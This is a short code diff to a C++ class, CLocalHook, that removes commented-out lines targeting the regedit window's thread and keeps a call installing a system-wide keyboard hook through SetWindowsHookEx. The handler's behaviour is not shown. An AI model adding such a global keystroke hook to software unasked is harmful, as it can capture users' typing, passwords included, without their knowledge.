@@ -71,14 +71,6 @@ void CLocalHook::startLocalHook()
 {
     if ( NULL == _oldHook )
     {
-//        HWND hwnd = FindWindow(NULL, "regedit.exe");
-//
-//        DWORD processID;
-//        DWORD threadID;
-//        threadID = GetWindowThreadProcessId(hwnd,&processID);
-//        _hInst = GetModuleHandleA("dll.dll");
-//        _oldHook = SetWindowsHookEx(WH_KEYBOARD, (FARPROC)keyProc, _hInst, threadID);
-
         _oldHook = SetWindowsHookEx(WH_KEYBOARD, (FARPROC)keyProc, _hInst, NULL);
     }
     return;
